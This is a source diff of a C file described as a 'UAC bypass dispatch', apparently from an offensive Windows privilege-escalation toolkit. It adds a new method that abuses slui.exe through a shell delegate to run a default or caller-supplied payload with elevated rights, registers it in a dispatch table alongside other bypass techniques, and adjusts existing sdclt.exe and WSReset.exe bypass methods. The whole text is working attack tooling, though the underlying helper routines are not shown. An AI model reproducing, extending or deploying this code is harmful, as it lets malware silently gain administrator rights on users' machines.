@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.24
+*  VERSION:     3.25
 *
-*  DATE:        20 Apr 2020
+*  DATE:        05 May 2020
 *
 *  UAC bypass dispatch.
 *
@@ -72,6 +72,7 @@ UCM_API(MethodShellWSReset);
 UCM_API(MethodEditionUpgradeManager);
 UCM_API(MethodDebugObject);
 UCM_API(MethodGlupteba);
+UCM_API(MethodShellChangePk);
 
 UCM_EXTRA_CONTEXT WDCallbackType1;
 
@@ -145,7 +146,8 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodSysprep, NULL, { 7600, 9600 }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodEditionUpgradeManager, NULL, { 14393, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodDebugObject, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
-    { MethodGlupteba, NULL, { 7600, 15063 }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }
+    { MethodGlupteba, NULL, { 7600, 15063 }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodShellChangePk, NULL, { 14393, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }
 };
 
 #define WDCallbackTypeMagicVer1 282647531814912
@@ -1153,14 +1155,13 @@ UCM_API(MethodShellSdctl)
 {
     LPWSTR Payload = NULL;
 
-    UNREFERENCED_PARAMETER(Parameter);
-
     if (g_ctx->OptionalParameterLength == 0)
         Payload = g_ctx->szDefaultPayload;
     else
         Payload = g_ctx->szOptionalParameter;
 
     return ucmShellDelegateExecuteCommandMethod(
+        Parameter->Method,
         SDCLT_EXE,
         _strlen(SDCLT_EXE),
         T_CLASSESFOLDER,
@@ -1193,9 +1194,6 @@ UCM_API(MethodShellWSReset)
     LPWSTR PayloadParameter = NULL, PayloadFinal = NULL;
     SIZE_T Size;
 
-    UNREFERENCED_PARAMETER(Parameter);
-
-
     if (g_ctx->OptionalParameterLength == 0)
         PayloadParameter = g_ctx->szDefaultPayload;
     else
@@ -1211,6 +1209,7 @@ UCM_API(MethodShellWSReset)
         _strcat(PayloadFinal, PayloadParameter);
 
         Result = ucmShellDelegateExecuteCommandMethod(
+            Parameter->Method,
             WSRESET_EXE,
             _strlen(WSRESET_EXE),
             T_APPXPACKAGE,
@@ -1266,4 +1265,26 @@ UCM_API(MethodGlupteba)
         lpszPayload = g_ctx->szOptionalParameter;
 
     return ucmGluptebaMethod(lpszPayload);
+}
+
+UCM_API(MethodShellChangePk)
+{
+    LPWSTR lpszPayload = NULL;
+
+    //
+    // Select target application or use given by optional parameter.
+    //
+    if (g_ctx->OptionalParameterLength == 0)
+        lpszPayload = g_ctx->szDefaultPayload;
+    else
+        lpszPayload = g_ctx->szOptionalParameter;
+
+    return ucmShellDelegateExecuteCommandMethod(
+        Parameter->Method,
+        SLUI_EXE,
+        _strlen(SLUI_EXE),
+        T_LAUNCHERSYSTEMSETTINGS,
+        _strlen(T_LAUNCHERSYSTEMSETTINGS),
+        lpszPayload,
+        _strlen(lpszPayload));
 }
